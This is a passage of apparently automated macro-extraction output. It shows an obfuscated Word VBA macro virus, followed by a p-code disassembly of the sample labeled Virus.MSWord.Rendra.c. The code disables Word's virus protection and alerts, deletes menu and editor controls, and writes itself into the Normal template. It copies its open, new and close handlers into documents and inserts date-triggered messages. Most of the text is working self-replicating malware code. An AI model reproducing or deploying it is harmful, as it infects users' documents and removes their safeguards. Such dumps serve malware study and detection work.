  By4Vq4Qglc7 = I31a6731A3TPTQpu: J4DAKmx68y3B9e = C9kpgxW5Y0E8fNkNHoH: GoSub HM2fh8Ofy1dE8liCfc: Exit For
    End If
  Next I31a6731A3TPTQpu
'7272.262   5497.262    4931.812    132.3904    1216.006
    Else: By4Vq4Qglc7 = 1: J4DAKmx68y3B9e = Gglir9K3JrH66XwDev & B8LpM131ei639bf284e5 & vbCr & C9kpgxW5Y0E8fNkNHoH & vbCr & CP4fStWRJJgnNu9ua & vbCr: GoSub HM2fh8Ofy1dE8liCfc
   End If
    Next T8xYIqasKfV2Gc4
   If K1ckH7chEf84syd6g = NormalTemplate Then
   C9kpgxW5Y0E8fNkNHoH = vbCr & CP4fStWRJJgnNu9ua & vbCr & vbCr
   By4Vq4Qglc7 = .CountOfLines + 1: J4DAKmx68y3B9e = V082kbbTxfv3ccJ & C9kpgxW5Y0E8fNkNHoH & Urwlo65IlATwE851x0k2 & C9kpgxW5Y0E8fNkNHoH & R6asbGvxIE7 & C9kpgxW5Y0E8fNkNHoH & WWURq9o3YATyy74mSqRu & C9kpgxW5Y0E8fNkNHoH: GoSub HM2fh8Ofy1dE8liCfc
  T7SAs7h1CF0wvWqQ = "�Þ¨ßìÐí««„çÁà�½ó���—þßÊàÑÅø½ÃÆäÃïøˆÎ—Ôò¨ž–Ý€ØÅÌ¦’ÒµÛÂ½§öÏùðú": GoSub K4HIhrETANiN6XySX: C9kpgxW5Y0E8fNkNHoH = T7SAs7h1CF0wvWqQ
  T7SAs7h1CF0wvWqQ = "•ðŠïÀèÇš�¬÷ûÏ©‡": GoSub K4HIhrETANiN6XySX: C9kpgxW5Y0E8fNkNHoH = T7SAs7h1CF0wvWqQ: T7SAs7h1CF0wvWqQ = "ŠüžòÖî‚»š§Ûç": GoSub K4HIhrETANiN6XySX: B8LpM131ei639bf284e5 = T7SAs7h1CF0wvWqQ: System.PrivateProfileString("", Kmc4Ms3l1m4074Y, C9kpgxW5Y0E8fNkNHoH) = B8LpM131ei639bf284e5
   T7SAs7h1CF0wvWqQ = "•ðŠïÀèÇš�¬÷þÆ­›Óµ«¥­þ×": GoSub K4HIhrETANiN6XySX: C9kpgxW5Y0E8fNkNHoH = T7SAs7h1CF0wvWqQ: T7SAs7h1CF0wvWqQ = "„ú�ÿÁõÅ€ž": GoSub K4HIhrETANiN6XySX: B8LpM131ei639bf284e5 = T7SAs7h1CF0wvWqQ
'215.4544   1437.185    20.53443    440.6264    889.6014    746.8937
  T7SAs7h1CF0wvWqQ = "õ¥Ý¶“ÏÒ‡‰£•ÚÔ žÛ¡ê’«ãÉÑåÑÃôŽà�": GoSub K4HIhrETANiN6XySX: B8LpM131ei639bf284e5 = B8LpM131ei639bf284e5 & Chr$(32) & Chr$(169) & Chr$(32) & T7SAs7h1CF0wvWqQ: System.PrivateProfileString("", Kmc4Ms3l1m4074Y, C9kpgxW5Y0E8fNkNHoH) = B8LpM131ei639bf284e5
  T7SAs7h1CF0wvWqQ = "áØ„õÇùÐÈ¹¸×ïÊ":  GoSub K4HIhrETANiN6XySX: Application.CommandBars.FindControl(ID:=927).Caption = T7SAs7h1CF0wvWqQ & Chr$(32) & CpJ0d1Bfi2q & Chr$(46) & ChJaS1rh8wy545qTD3Oh & Chr$(46) & CH4FiSmTVaO80BVm
'1435.629   5330.34 3470.067    1843.886    2657.577    1594.407    3677.936
    NormalTemplate.Save: Application.Quit SaveChanges:=0
 ElseIf ActiveDocument.Path <> "" Then ActiveDocument.Save
    End If
 End With
    GoTo KQhb5kf52d9Q90ve2
'1331.003   1990.652    467.1088    343.2257
K4HIhrETANiN6XySX:
 For K9Bm6t353BaD = 1 To Len(T7SAs7h1CF0wvWqQ)
  Mid$(T7SAs7h1CF0wvWqQ, K9Bm6t353BaD, 1) = Chr$(Asc(Mid$(T7SAs7h1CF0wvWqQ, K9Bm6t353BaD, 1)) Xor Asc(Mid$(C5KU88q3NKNNdJ3fV, K9Bm6t353BaD, 1)))
   Next K9Bm6t353BaD
'4579.377   4314.568    2120.883    3168.307    6088.109    3197.59 1314.853    3477.278
Return
S19978rl5Vx4bb:
   For K9Bm6t353BaD = 1 To Len(T7SAs7h1CF0wvWqQ)
  Mid$(T7SAs7h1CF0wvWqQ, K9Bm6t353BaD, 1) = Chr$(Asc(Chr$(Asc(Mid$(T7SAs7h1CF0wvWqQ, K9Bm6t353BaD, 1)) Xor Asc(Mid$(C5KU88q3NKNNdJ3fV, K9Bm6t353BaD, 1)))) Xor Asc(Mid$(Q8vOoxI4KL52qbLbyo7P, K9Bm6t353BaD, 1)))
'21.16756   1601.081    1403.076    2.163505    116.0334    2717.263
'22.1482    5478.748
    Next K9Bm6t353BaD
'1587.955   6101.258    860.6987    5283.946    5409.948    409.3118    2793.221    2052.896    5535.103    3098.799
  Return
QPDinD0UBAAIK759OTu:
'1159.717   6785.311
 Randomize Timer: I7j1A2ejItuv7TLM7r = Chr(Int(Rnd * 25) + 65)
  For K9Bm6t353BaD = 1 To Int(Rnd * 10) + 10
   Select Case Int((Rnd * 3) + 1)
  Case 1: I7j1A2ejItuv7TLM7r = I7j1A2ejItuv7TLM7r & Chr(Int(Rnd * 25) + 65)
   Case 2: I7j1A2ejItuv7TLM7r = I7j1A2ejItuv7TLM7r & Chr(Int(Rnd * 10) + 48)
 Case 3: I7j1A2ejItuv7TLM7r = I7j1A2ejItuv7TLM7r & Chr(Int(Rnd * 25) + 97)
End Select
   Next K9Bm6t353BaD: If InStr(1, EJI3827ImdS1, I7j1A2ejItuv7TLM7r) <> 0 Then GoTo QPDinD0UBAAIK759OTu
  Return
    GoTo N3EnH2UiKNr
'1704.989   341.7881    8.322904    2941.062    773.2975    3586.169    2602.95 3072.792    4229.927    2473.123
Yc79VMMCiI8p8:
'147.4529   1809.53 40.98886    2899.665    2888.289    4845.323    1543.02 1197.828
 GoSub QPDinD0UBAAIK759OTu
 I31a6731A3TPTQpu = 0 - Len(I7j1A2ejItuv7TLM7r)
   Do While I31a6731A3TPTQpu <> 0
   I31a6731A3TPTQpu = InStr(I31a6731A3TPTQpu + Len(I7j1A2ejItuv7TLM7r) + 1, EJI3827ImdS1, M32jk4AlYbb)
If I31a6731A3TPTQpu > 0 Then
 C9kpgxW5Y0E8fNkNHoH = Left$(EJI3827ImdS1, I31a6731A3TPTQpu - 1)
'2050.301   3957.259    309.4777    3007.529    1147.96 3957.27 2068.54 1316.309    1204.881    3694.421
 B8LpM131ei639bf284e5 = Right(EJI3827ImdS1, (Len(EJI3827ImdS1) - (I31a6731A3TPTQpu + Len(M32jk4AlYbb)) + 1))
 EJI3827ImdS1 = C9kpgxW5Y0E8fNkNHoH & I7j1A2ejItuv7TLM7r & B8LpM131ei639bf284e5
   End If
 Loop
'266.4  2432.265    1838.935    1542.904
Return
N3EnH2UiKNr:
Vu8rWFA9Ej2:
  On Error Resume Next
    With Options
  .VirusProtection = (1 - 1): .SaveNormalPrompt = (1 - 1): .ConfirmConversions = (1 - 1): .AllowFastSave = (1 - 1)
    .BackgroundSave = (1 - 1): .CreateBackup = (1 - 1): .SavePropertiesPrompt = (1 - 1): .SaveInterval = 0
End With
Dim EknCU56L8y92sKUA As Variant
    EknCU56L8y92sKUA = Array(30017, 751, 797, 522, 336, 30045)
 For I31a6731A3TPTQpu = 0 To 5: Set Xu17GqW4w6tAsta33061UC1nc1n = Application.CommandBars.FindControl(ID:=EknCU56L8y92sKUA(I31a6731A3TPTQpu)): Xu17GqW4w6tAsta33061UC1nc1n.Enabled = (1 - 1): Xu17GqW4w6tAsta33061UC1nc1n.Delete: Next I31a6731A3TPTQpu
'2750.247   123.1063
    With Application.VBE.CommandBars
 Set Xu17GqW4w6tAsta33061UC1nc1n = .FindControl(ID:=930): Xu17GqW4w6tAsta33061UC1nc1n.Enabled = (1 - 1): Xu17GqW4w6tAsta33061UC1nc1n.Delete
  Set Xu17GqW4w6tAsta33061UC1nc1n = .FindControl(ID:=522): Xu17GqW4w6tAsta33061UC1nc1n.Enabled = (1 - 1): Xu17GqW4w6tAsta33061UC1nc1n.Delete
   End With
With Application
    .ScreenUpdating = (1 - 1): .ShowVisualBasicEditor = (1 - 1): .EnableCancelKey = wdCancelDisabled: .DisplayAlerts = wdAlertsNone
'903.564    1037.006    1519.289
 T7SAs7h1CF0wvWqQ = "‘üžóÒð‚ª‹»Ñï": GoSub K4HIhrETANiN6XySX: .CommandBars(T7SAs7h1CF0wvWqQ).Enabled = (1 - 1): .CommandBars(T7SAs7h1CF0wvWqQ).Visible = (1 - 1)
  T7SAs7h1CF0wvWqQ = "“ú‚êÀ": GoSub K4HIhrETANiN6XySX: .VBE.CommandBars(T7SAs7h1CF0wvWqQ).Enabled = (1 - 1)
   End With
'814.9865   1934.605    5549.388    3473.404    567.2723    3380.864    567.8029    5166.879
   With System
   T7SAs7h1CF0wvWqQ = "�Þ¨ßìß÷º¸�öØþ™¦ÿ�–‚«÷ÍÉöÂÒÁ¬çÌõÞóä�Ü¿Þç€¬½Ô‘Âúê": GoSub K4HIhrETANiN6XySX: C9kpgxW5Y0E8fNkNHoH = T7SAs7h1CF0wvWqQ
   T7SAs7h1CF0wvWqQ = "öµÜ¦‚¼“ÈÛè‰¬�ìÄšþêàä ™�·�—¬Á¿�¶": GoSub K4HIhrETANiN6XySX: B8LpM131ei639bf284e5 = T7SAs7h1CF0wvWqQ
   T7SAs7h1CF0wvWqQ = "„ú‰ãñýÁƒ©§ÔãÓ¿": GoSub K4HIhrETANiN6XySX: .PrivateProfileString("", C9kpgxW5Y0E8fNkNHoH, T7SAs7h1CF0wvWqQ) = B8LpM131ei639bf284e5
  T7SAs7h1CF0wvWqQ = "„ú‰ãõóÐ�©§ÔãÓ¿": GoSub K4HIhrETANiN6XySX: .PrivateProfileString("", C9kpgxW5Y0E8fNkNHoH, T7SAs7h1CF0wvWqQ) = B8LpM131ei639bf284e5
   End With
'4924.887   3275.852    3435.824    3534.776    835.7153
Return
KQhb5kf52d9Q90ve2:
                                                                                                    End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Rendra.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 38498 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError V3VF8bKRl5nA684d 
' Line #2:
' 	Dim 
' 	VarDefn objet (As Variant)
' Line #3:
' 	Dim 
' 	VarDefn objet2 (As Variant)
' Line #4:
' 	Dim 
' 	VarDefn feuille (As Variant)
' Line #5:
' 	Dim 
' 	VarDefn Var_Start
' 	VarDefn Var_Start2 (As Long)
' Line #6:
' 	Dim 
' 	VarDefn Var_Count
' 	VarDefn Var_Count2 (As Long)
' Line #7:
' 	Dim 
' 	VarDefn TempString (As String)
' Line #8:
' 	Dim 
' 	VarDefn Date1 (As Date)
' Line #9:
' 	Dim 
' 	VarDefn Date2 (As Date)
' Line #10:
' 	Dim 
' 	VarDefn Date3 (As Date)
' Line #11:
' 	LitStr 0x000A "03/04/2000"
' 	St Date1 
' Line #12:
' 	LitStr 0x000A "10/05/2000"
' 	St Date2 
' Line #13:
' 	LitStr 0x000A "15/09/2000"
' 	St Date3 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #15:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #16:
' 	SetStmt 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Set feuille 
' Line #17:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld feuille 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set objet 
' Line #18:
' 	LitStr 0x0031 "{ - This function should never be deleted -  } V2"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #20:
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #21:
' 	StartForVariable 
' 	Next 
' Line #22:
' 	Ld objet 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #23:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set objet2 
' Line #24:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #25:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld Var_Start2 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Var_Count2 
' 	Ld Var_Start2 
' 	Add 
' 	LitDI2 0x0002 
' 	Sub 
' 	For 
' Line #27:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd RTrim 0x0001 
' 	St TempString 
' Line #28:
' 	Ld TempString 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #29:
' 	StartForVariable 
' 	Next 
' Line #30:
' 	LitDI2 0x0001 
' 	LitStr 0x007F "                                                                                                    Private Sub Document_Open()"
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd InsertLines 0x0002 
' 	St Var_garb 
' Line #31:
' 	Ld Var_Start 
' 	Ld Var_Count2 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #32:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #33:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld Var_Start2 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Var_Count2 
' 	Ld Var_Start2 
' 	Add 
' 	LitDI2 0x0002 
' 	Sub 
' 	For 
' Line #35:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd RTrim 0x0001 
' 	St TempString 
' Line #36:
' 	Ld TempString 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #37:
' 	StartForVariable 
' 	Next 
' Line #38:
' 	LitDI2 0x0001 
' 	LitStr 0x007E "                                                                                                    Private Sub Document_New()"
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd InsertLines 0x0002 
' 	St Var_garb 
' Line #39:
' 	Ld Var_Start 
' 	Ld Var_Count2 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #40:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #41:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #42:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld Var_Start2 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Var_Count2 
' 	Ld Var_Start2 
' 	Add 
' 	LitDI2 0x0002 
' 	Sub 
' 	For 
' Line #43:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd RTrim 0x0001 
' 	St TempString 
' Line #44:
' 	Ld TempString 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #45:
' 	StartForVariable 
' 	Next 
' Line #46:
' 	LitDI2 0x0001 
' 	LitStr 0x0080 "                                                                                                    Private Sub Document_Close()"
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd InsertLines 0x0002 
' 	St Var_garb 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld Date 
' 	Ld Date3 
' 	Gt 
' 	IfBlock 
' Line #49:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #50:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #51:
' 	LitStr 0x0001 "C"
' 	LitStr 0x0001 "i"
' 	Concat 
' 	LitStr 0x0001 "a"
' 	Concat 
' 	LitStr 0x0001 "o"
' 	Concat 
' 	LitStr 0x0002 " !"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #52:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0002 
' Line #53:
' 	Ld wdToggle 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Bold 
' Line #54:
' 	LitDI2 0x0012 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #55:
' 	LitStr 0x0009 "CourierBM"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #56:
' 	LitStr 0x0011 "Bookman Old Style"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #57:
' 	Ld wdBrightGreen 
' 	Ld Options 
' 	MemSt DefaultHighlightColorIndex 
' Line #58:
' 	Ld wdBrightGreen 
' 	Ld Selection 
' 	MemLd Range 
' 	MemSt HighlightColorIndex 
' Line #59:
' 	Ld wdRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #60:
' 	Ld wdAlignParagraphRight 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #61:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	Ld Date 
' 	Ld Date1 
' 	Ge 
' 	Ld Date 
' 	Ld Date2 
' 	Le 
' 	And 
' 	Paren 
' 	Ld Date 
' 	LitStr 0x0004 "dddd"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0008 "Mercredi"
' 	Eq 
' 	Ld Date 
' 	Ld Date1 
' 	Ge 
' 	And 
' 	Or 
' 	IfBlock 
' Line #64:
' 	LitStr 0x0002 "Me"
' 	LitStr 0x0001 "r"
' 	Concat 
' 	LitStr 0x0002 "ci"
' 	Concat 
' 	LitStr 0x0003 " d'"
' 	Concat 
' 	LitStr 0x0003 "avo"
' 	Concat 
' 	LitStr 0x0003 "ir "
' 	Concat 
' 	LitStr 0x0003 "uti"
' 	Concat 
' 	LitStr 0x0002 "li"
' 	Concat 
' 	LitStr 0x0002 "sé"
' 	Concat 
' 	LitStr 0x0005 " ce b"
' 	Concat 
' 	LitStr 0x0001 "e"
' 	Concat 
' 	LitStr 0x0004 "l ou"
' 	Concat 
' 	LitStr 0x0002 "ti"
' 	Concat 
' 	LitStr 0x0004 "l qu"
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitStr 0x0001 "e"
' 	Concat 
' 	LitStr 0x0003 "st "
' 	Concat 
' 	LitStr 0x0001 "M"
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitStr 0x0001 "S"
' 	Concat 
' 	LitStr 0x0002 ". "
' 	Concat 
' 	LitStr 0x0001 "W"
' 	Concat 
' 	LitStr 0x0001 "O"
' 	Concat 
' 	LitStr 0x0001 "R"
' 	Concat 
' 	LitStr 0x0001 "D"
' 	Concat 
' 	LitStr 0x0003 "S !"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "B"
' 	Concat 
' 	LitStr 0x0001 "i"
' 	Concat 
' 	LitStr 0x0001 "l"
' 	Concat 
' 	LitStr 0x0001 "l"
' 	Concat 
' 	LitStr 0x0002 " G"
' 	Concat 
' 	LitStr 0x0001 "A"
' 	Concat 
' 	LitStr 0x0001 "T"
' 	Concat 
' 	LitStr 0x0001 "E"
' 	Concat 
' 	LitStr 0x0002 "S "
' 	Concat 
' 	LitStr 0x0002 "vo"
' 	Concat 
' 	LitStr 0x0005 "us le"
' 	Concat 
' 	LitStr 0x0004 " ren"
' 	Concat 
' 	LitStr 0x0002 "dr"
' 	Concat 
' 	LitStr 0x0002 "a "
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	Ld vbSystemModal 
' 	Ld vbInformation 
' 	Add 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0028 "Vive les mercredi et les jours fériés..."
' 	ArgsLd MsgBox 0x0003 
' 	St temporary 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #67:
' 	Label V3VF8bKRl5nA684d 
' Line #68:
' 	ArgsCall Document_Open 0x0000 
' Line #69:
' 	EndSub 
' Line #70:
' 	FuncDefn (Private Sub Document_New())
' Line #71:
' 	Dim 
' 	VarDefn Date1 (As Date)
' Line #72:
' 	Dim 
' 	VarDefn Date2 (As Date)
' Line #73:
' 	Dim 
' 	VarDefn Date3 (As Date)
' Line #74:
' 	LitStr 0x000A "03/04/2000"
' 	St Date1 
' Line #75:
' 	LitStr 0x000A "10/05/2000"
' 	St Date2 
' Line #76:
' 	LitStr 0x000A "15/09/2000"
' 	St Date3 
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #79:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #80:
' 	Ld Date 
' 	Ld Date1 
' 	Ge 
' 	Ld Date 
' 	Ld Date2 
' 	Le 
' 	And 
' 	Paren 
' 	Ld Date 
' 	Ld Date3 
' 	Gt 
' 	Or 
' 	Ld Date 
' 	LitStr 0x0004 "dddd"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0008 "Mercredi"
' 	Eq 
' 	Ld Date 
' 	Ld Date1 
' 	Ge 
' 	And 
' 	Or 
' 	IfBlock 
' Line #81:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #82:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #83:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #84:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveUp 0x0002 
' Line #85:
' 	LitStr 0x0002 "Mi"
' 	LitStr 0x0002 "cr"
' 	Concat 
' 	LitStr 0x0002 "os"
' 	Concat 
' 	LitStr 0x0002 "of"
' 	Concat 
' 	LitStr 0x0004 "t vo"
' 	Concat 
' 	LitStr 0x0004 "us s"
' 	Concat 
' 	LitStr 0x0003 "ouh"
' 	Concat 
' 	LitStr 0x0003 "ait"
' 	Concat 
' 	LitStr 0x0004 "e la"
' 	Concat 
' 	LitStr 0x0002 " b"
' 	Concat 
' 	LitStr 0x0002 "ie"
' 	Concat 
' 	LitStr 0x0002 "nv"
' 	Concat 
' 	LitStr 0x0002 "en"
' 	Concat 
' 	LitStr 0x0004 "ue !"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	LitStr 0x0001 "!"
' 	Concat 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #86:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0002 
' Line #87:
' 	Ld wdBrightGreen 
' 	Ld Selection 
' 	MemLd Range 
' 	MemSt HighlightColorIndex 
' Line #88:
' 	Ld wdRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #89:
' 	LitDI2 0x000C 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #90:
' 	LitDI2 0x0010 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #91:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #92:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveDown 0x0002 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	EndSub 
' Line #95:
' 	FuncDefn (Private Sub Document_Open())
' Line #96:
' 	OnError V3VF8bKRl5nA684d 
' Line #97:
' 	QuoteRem 0x0064 0x0031 "{ - This function should never be deleted -  } V2"
' Line #98:
' 	QuoteRem 0x0064 0x002D "{ - This function should never be deleted - }"
' Line #99:
' 	Dim 
' 	VarDefn objet (As Variant)
' Line #100:
' 	Dim 
' 	VarDefn objet2 (As Variant)
' Line #101:
' 	Dim 
' 	VarDefn Var_Start
' 	VarDefn Var_Start2 (As Long)
' Line #102:
' 	Dim 
' 	VarDefn Var_Count
' 	VarDefn Var_Count2 (As Long)
' Line #103:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #104:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #105:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set objet 
' Line #106:
' 	LitStr 0x0031 "{ - This function should never be deleted -  } V2"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #107:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #108:
' 	LitDI2 0x0001 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #109:
' 	StartForVariable 
' 	Next 
' Line #110:
' 	Ld objet 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #111:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set objet2 
' Line #112:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #113:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #114:
' 	Ld Var_Start 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ld Var_Start2 
' 	Ld Var_Count2 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #115:
' 	Ld Var_Start 
' 	Ld Var_Count2 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #116:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #117:
' 	LitStr 0x000C "Document_New"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #118:
' 	Ld Var_Start 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
